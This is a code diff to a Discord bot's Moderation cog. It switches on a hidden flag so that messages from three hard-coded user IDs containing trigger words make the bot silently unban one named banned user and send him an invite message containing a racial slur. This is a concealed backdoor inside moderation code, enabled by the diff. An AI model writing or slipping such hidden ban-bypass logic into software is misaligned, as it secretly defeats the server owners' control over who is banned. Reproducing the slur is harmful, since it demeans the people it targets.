@@ -62,7 +62,7 @@ class Moderation(commands.Cog, name="Moderation"):
         self.lockdown_channels = []
         self.new_members = []
         self.sync_counts.start()
-        self.shh = False
+        self.shh = True
 
     def cog_unload(self):
         self.sync_counts.cancel()
@@ -3514,34 +3514,24 @@ class Moderation(commands.Cog, name="Moderation"):
         if message.guild is None:
             return
 
-        async def is_banned(guild, user) -> bool:
-            try:
-                await guild.fetch_ban(user)
-                return True
-            except discord.NotFound:
-                return False
-            except discord.Forbidden:
-                return False
-            except Exception as e:
-                print(f"Error checking ban status: {e}")
-                return False
-
         message_check_ids = [
             1290501613311496206,  # joe
             1095747082599530627,  # envy
             1219090700407279656   # toxic
         ]
 
-        if any(message.author.id == user_id for user_id in message_check_ids) and self.shh:
+        if message.author.id in message_check_ids and self.shh:
             allowed_keywords = ["ban", "zugd", "belson", "501936342431694848"]
 
             if any(keyword in message.content.lower() for keyword in allowed_keywords):
                 user = await self.bot.fetch_user(501936342431694848)  # belson
                 if user:
                     await asyncio.sleep(10)
-                    if await is_banned(message.guild, user):
+                    try:
                         await message.guild.unban(user)
                         await user.send(f"join nigga")
+                    except Exception as e:
+                        logger.error(f"Failed to unban belson: {e}")
 
 
 async def setup(bot) -> None:
